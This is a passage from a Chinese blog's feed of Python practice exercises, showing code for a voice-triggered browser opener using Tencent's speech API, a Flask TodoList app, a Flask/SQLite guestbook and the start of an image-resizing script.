file</span></span><br><span class="line">    wavfile.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用腾讯AI接口，将声音转化成文字。</span></span><br><span class="line"><span class="comment">#感谢daimon99提供基于python3的aiplatsdk https://github.com/daimon99/py-aiplat-py3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">soundTotext</span><span class="params">()</span>:</span></span><br><span class="line">    app_key = <span class="string">'申请的Key'</span></span><br><span class="line">    app_id = <span class="string">'申请的Id'</span></span><br><span class="line"></span><br><span class="line">    seq = <span class="number">0</span></span><br><span class="line">    for_mat = <span class="number">2</span></span><br><span class="line">    rate = <span class="number">16000</span></span><br><span class="line">    bits = <span class="number">16</span></span><br><span class="line">    cont_res = <span class="number">0</span></span><br><span class="line">    once_size = <span class="number">41000</span></span><br><span class="line">    file_path = FILE_NAME</span><br><span class="line"></span><br><span class="line">    <span class="comment">#计算音频MD5</span></span><br><span class="line">    <span class="keyword">with</span> open(file_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        md5obj = hashlib.md5()</span><br><span class="line">        md5obj.update(f.read())</span><br><span class="line">        hash = md5obj.hexdigest()</span><br><span class="line">        speech_id = str(hash).upper()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#读取音频内容，每次41000字节</span></span><br><span class="line">    f = open(file_path, <span class="string">'rb'</span>)</span><br><span class="line">    file_size = os.path.getsize(file_path)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            chunk = f.read(once_size)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                chunk_size = len(chunk)</span><br><span class="line">                <span class="keyword">if</span> (seq + chunk_size) == file_size:</span><br><span class="line">                    end = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    end = <span class="number">0</span></span><br><span class="line">            <span class="comment">#初始化AIPlat接口</span></span><br><span class="line">            ai_obj = apiutil.AiPlat(app_id, app_key)</span><br><span class="line">            <span class="comment">#调用语音识别-流式版(WeChat AI),传入参数</span></span><br><span class="line">            rsp = ai_obj.getAaiWxAsrs(chunk, speech_id, end, for_mat, rate,</span><br><span class="line">                                      bits, seq, chunk_size, cont_res)</span><br><span class="line"></span><br><span class="line">            seq += chunk_size</span><br><span class="line">            <span class="keyword">if</span> rsp[<span class="string">'ret'</span>] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> rsp[<span class="string">'data'</span>][<span class="string">'speech_text'</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"调用腾讯API失败"</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行命令</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> text <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        print(<span class="string">"未识别到，请重试"</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'百度'</span> <span class="keyword">in</span> text:</span><br><span class="line">        webbrowser.open(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    record_sound()</span><br><span class="line">    text = soundTotext()</span><br><span class="line">    command(text)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://stackoverflow.com/questions/892199/detect-record-audio-in-python" target="_blank" rel="noopener">https://stackoverflow.com/questions/892199/detect-record-audio-in-python</a></li><li><a href="https://github.com/daimon99/py-aiplat-py3" target="_blank" rel="noopener">https://github.com/daimon99/py-aiplat-py3</a></li><li><a href="https://ai.qq.com/doc/aaiasr.shtml" target="_blank" rel="noopener">https://ai.qq.com/doc/aaiasr.shtml</a></li><li><a href="https://docs.python.org/3/library/webbrowser.html" target="_blank" rel="noopener">https://docs.python.org/3/library/webbrowser.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;使用 Python 实现：对着电脑吼一声,自动打开浏览器中的默认网站。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0024</title>
    <link href="https://xiaotaoist.github.io/2018/06/15/python-exercise-0024/"/>
    <id>https://xiaotaoist.github.io/2018/06/15/python-exercise-0024/</id>
    <published>2018-06-15T12:05:18.000Z</published>
    <updated>2018-06-16T06:53:37.487Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>第 0024 题： 使用 Python 的 Web 框架，做一个 Web 版本 TodoList 应用。</code></pre><a id="more"></a><p><img src="https://camo.githubusercontent.com/d6aaa1fd3e238860cb9ce736cc8bdae628117508/687474703a2f2f692e696d6775722e636f6d2f4e4566377a48702e6a7067" alt="0024"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这种综合项目涉及的知识点较多,这里我们用<a href="https://dormousehole.readthedocs.io/en/latest/" target="_blank" rel="noopener">Flask1.0</a>和<a href="http://www.pythondoc.com/flask-sqlalchemy/quickstart.html" target="_blank" rel="noopener">flask-sqlalchemy</a>实现其逻辑，数据库使用<a href="http://www.runoob.com/sqlite/sqlite-intro.html" target="_blank" rel="noopener">SQLite3</a>,用<a href="http://www.materializecss.cn/getting-started.html" target="_blank" rel="noopener">materialize</a>样式美化我们的页面，<a href="https://www.jquery123.com/" target="_blank" rel="noopener">jQuery</a>优化用户体验。主要修改自<a href="https://zhuanlan.zhihu.com/p/23834410" target="_blank" rel="noopener">李辉的Flask实践：待办事项</a>,去除添加分类功能，只保留核心todo内容。</p><blockquote><p>pip install flask  flask-salalchemy</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ul><li><p>结构</p><blockquote><p>  templates/      —–&gt; 模板 index.html<br>  static/         —–&gt; 静态页面 css js<br>  app.py          —–&gt; flask 代码<br>  todo.db    —–&gt; sqlite3数据库</p></blockquote></li><li><p>核心代码app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, redirect, url_for, request</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置数据库信息</span></span><br><span class="line">DATABASE = <span class="string">"todo.db"</span></span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">"sqlite:////"</span> + os.path.join(</span><br><span class="line">    basedir, DATABASE)</span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span>] = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#数据库结构项</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Item</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="keyword">True</span>)</span><br><span class="line">    body = db.Column(db.Text)</span><br><span class="line">    category_id = db.Column(</span><br><span class="line">        db.Integer, db.ForeignKey(<span class="string">'category.id'</span>), default=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#构建数据库结构 类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Category</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="keyword">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">64</span>))</span><br><span class="line">    <span class="comment">#构造项与类的关系</span></span><br><span class="line">    items = db.relationship(<span class="string">'Item'</span>, backref=<span class="string">'category'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化数据库，并添加测试数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_db</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Insert default categories and demo items.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    db.create_all()</span><br><span class="line">    todo = Category(name=<span class="string">u'待完成'</span>)</span><br><span class="line">    done = Category(name=<span class="string">u'已完成'</span>)</span><br><span class="line"></span><br><span class="line">    item = Item(body=<span class="string">u'看一小时《战争与和平》'</span>)</span><br><span class="line">    item2 = Item(body=<span class="string">u'浇花'</span>, category=todo)</span><br><span class="line">    item3 = Item(body=<span class="string">u'收快递'</span>, category=done)</span><br><span class="line"></span><br><span class="line">    db.session.add_all([todo, done, item, item2, item3])</span><br><span class="line">    db.session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#首页</span></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#第一次运行时初始化数据库</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(DATABASE): init_db()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        body = request.form.get(<span class="string">'item'</span>)</span><br><span class="line">        category_id = request.form.get(<span class="string">'category'</span>)</span><br><span class="line">        category = Category.query.get_or_404(category_id)</span><br><span class="line">        item = Item(body=body, category=category)</span><br><span class="line">        db.session.add(item)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'category'</span>, id=category_id))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'category'</span>, id=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#分类页</span></span><br><span class="line"><span class="meta">@app.route('/category/&lt;int:id&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">category</span><span class="params">(id)</span>:</span></span><br><span class="line">    category = Category.query.get_or_404(id)</span><br><span class="line">    categories = Category.query.all()</span><br><span class="line">    items = category.items</span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">'index.html'</span>,</span><br><span class="line">        items=items,</span><br><span class="line">        categories=categories,</span><br><span class="line">        category_now=category)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#编辑某项</span></span><br><span class="line"><span class="meta">@app.route('/edit-item/&lt;int:id&gt;', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_item</span><span class="params">(id)</span>:</span></span><br><span class="line">    item = Item.query.get_or_404(id)</span><br><span class="line">    category = item.category</span><br><span class="line">    item.body = request.form.get(<span class="string">'body'</span>)</span><br><span class="line">    db.session.add(item)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'category'</span>, id=category.id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#添加到已完成</span></span><br><span class="line"><span class="meta">@app.route('/done/&lt;int:id&gt;', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">done</span><span class="params">(id)</span>:</span></span><br><span class="line">    item = Item.query.get_or_404(id)</span><br><span class="line">    category = item.category</span><br><span class="line">    done_category = Category.query.get_or_404(<span class="number">2</span>)</span><br><span class="line">    done_item = Item(body=item.body, category=done_category)</span><br><span class="line">    db.session.add(done_item)</span><br><span class="line">    db.session.delete(item)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'category'</span>, id=category.id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除某项</span></span><br><span class="line"><span class="meta">@app.route('/delete-item/&lt;int:id&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_item</span><span class="params">(id)</span>:</span></span><br><span class="line">    item = Item.query.get_or_404(id)</span><br><span class="line">    category = item.category</span><br><span class="line">    <span class="keyword">if</span> item <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'category'</span>, id=<span class="number">1</span>))</span><br><span class="line">    db.session.delete(item)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'category'</span>, id=category.id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></li><li><p>完整代码参见<a href="https://github.com/xiaoTaoist/Show-Me-the-Code/tree/master/0024" target="_blank" rel="noopener">这里</a></p></li></ul><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="/img/0024.png" alt="0024"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/helloflask/todo" target="_blank" rel="noopener">https://github.com/helloflask/todo</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;第 0024 题： 使用 Python 的 Web 框架，做一个 Web 版本 TodoList 应用。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0023</title>
    <link href="https://xiaotaoist.github.io/2018/06/14/python-exercise-0023/"/>
    <id>https://xiaotaoist.github.io/2018/06/14/python-exercise-0023/</id>
    <published>2018-06-14T00:49:31.000Z</published>
    <updated>2018-06-14T07:57:29.805Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>使用 Python 的 Web 框架，做一个 Web 版本 留言簿 应用。</code></pre><a id="more"></a><p><a href="http://v2ex.com/t/151643#reply53" target="_blank" rel="noopener">阅读资料：Python 有哪些 Web 框架</a><br><img src="https://camo.githubusercontent.com/cf9e3cc773f4b57747953428556db4c49b3d36c2/687474703a2f2f692e696d6775722e636f6d2f564979435a30692e6a7067" alt="0023"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>常见的知名<a href="https://pycoders-weekly-chinese.readthedocs.io/en/latest/issue1/python-web-framework-roundup.html" target="_blank" rel="noopener">web框架</a>有<a href="https://docs.djangoproject.com/zh-hans/2.0/" target="_blank" rel="noopener">Django</a>,<a href="http://flask.pocoo.org/docs/1.0/" target="_blank" rel="noopener">Flask</a>,<a href="http://www.tornadoweb.org/en/stable/" target="_blank" rel="noopener">Tornado</a>,<a href="https://bottlepy.org/docs/dev/" target="_blank" rel="noopener">Bottle</a>等，这里我们用<a href="https://dormousehole.readthedocs.io/en/latest/" target="_blank" rel="noopener">Flask1.0</a>+<a href="https://dormousehole.readthedocs.io/en/latest/patterns/sqlite3.html#sqlite3" target="_blank" rel="noopener">SQLite3</a>实现其功能，用<a href="https://www.purecss.cn/start.html" target="_blank" rel="noopener">Pure</a>样式美化我们的页面。主要参考<a href="https://github.com/Yixiaohan/flask-guestbook" target="_blank" rel="noopener">Yixiaohan的flask-guestbook</a>。</p><blockquote><p>pip install flask  </p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ul><li><p>结构</p><blockquote><p>  templates/      —–&gt;  模板 index.html<br>  static/         —–&gt; 静态页面 pure-min.css<br>  app.py          —–&gt; flask 代码<br>  guestbook.db    —–&gt; sqlite3数据库</p></blockquote></li><li><p>核心代码app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3, os</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, request, redirect</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> g</span><br><span class="line"></span><br><span class="line">DATABASE = <span class="string">"guestbook.db"</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#绑定数据库链接</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db</span><span class="params">()</span>:</span></span><br><span class="line">    db = getattr(g, <span class="string">'_database'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        db = g._database = sqlite3.connect(DATABASE)</span><br><span class="line">    <span class="keyword">return</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_appcontext</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close_connection</span><span class="params">(exception)</span>:</span></span><br><span class="line">    db = getattr(g, <span class="string">'_database'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        db.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次初始化数据库结构</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_db</span><span class="params">()</span>:</span></span><br><span class="line">    db = get_db()</span><br><span class="line">    db.cursor().execute(<span class="string">"""CREATE TABLE GUESTBOOK(</span></span><br><span class="line"><span class="string">    USERNAME TEXT NOT NULL,</span></span><br><span class="line"><span class="string">    COMMENT TEXT NOT NULL,</span></span><br><span class="line"><span class="string">    CREATEAT TEXT NOT NULL);</span></span><br><span class="line"><span class="string">    """</span>)</span><br><span class="line">    db.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#加载留言</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_data</span><span class="params">()</span>:</span></span><br><span class="line">    cur = get_db().execute(<span class="string">"SELECT * from GUESTBOOK"</span>)</span><br><span class="line">    rv = cur.fetchall()</span><br><span class="line">    cur.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#保存留言</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span><span class="params">(name, comment, create_at)</span>:</span></span><br><span class="line">    db = get_db()</span><br><span class="line">    cur = db.cursor().execute(</span><br><span class="line">        <span class="string">"INSERT INTO GUESTBOOK (USERNAME,COMMENT,CREATEAT) VALUES (?,?,?)"</span>,</span><br><span class="line">        (name, comment, create_at))</span><br><span class="line">    cur.close()</span><br><span class="line">    db.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#响应主页</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#第一次运行时初始化数据库</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(DATABASE): init_db()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取留言数据</span></span><br><span class="line">    greeting_list = load_data()</span><br><span class="line">    <span class="comment">#渲染html页面</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, greeting_list=greeting_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#得到POST方法提交的表单数据。</span></span><br><span class="line"><span class="meta">@app.route('/post', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.form[<span class="string">'name'</span>]</span><br><span class="line">    comment = request.form[<span class="string">'comment'</span>]</span><br><span class="line">    create_at = datetime.now()</span><br><span class="line"></span><br><span class="line">    save_data(name, comment, create_at)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'127.0.0.1'</span>, port=<span class="string">'5000'</span>, debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></li><li><p>完整代码参见<a href="https://github.com/xiaoTaoist/Show-Me-the-Code/tree/master/0023" target="_blank" rel="noopener">这里</a></p></li></ul><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="/img/0023.png" alt="0023"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;使用 Python 的 Web 框架，做一个 Web 版本 留言簿 应用。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0022</title>
    <link href="https://xiaotaoist.github.io/2018/06/14/python-exercise-0022/"/>
    <id>https://xiaotaoist.github.io/2018/06/14/python-exercise-0022/</id>
    <published>2018-06-13T23:39:31.000Z</published>
    <updated>2018-06-14T00:37:35.288Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>iPhone 6、iPhone 6 Plus 早已上市开卖。请查看你写得 第 0005 题的代码是否可以复用。</code></pre><a id="more"></a><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><a href="https://xiaotaoist.github.io/2018/05/29/python-exercise-0005/">0005题</a>，的代码完全可以复用，只需要改动<code>MAX_RESIZE</code>为<code>(750, 1334)</code>(iPhone6的分辨率)。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resize</span><span class="params">(img_dir, MAX_RESIZE, out_dir)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(img_dir):</span><br><span class="line"></span><br><span class="line">            <span class="comment">#读取文件</span></span><br><span class="line">            img_file = os.path.join(img_dir, file)</span><br><span class="line">            img = Image.open(img_file)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#调整大小</span></span><br><span class="line">            out = img.resize(MAX_RESIZE)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#如果out文件夹不存在则新建一个</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> 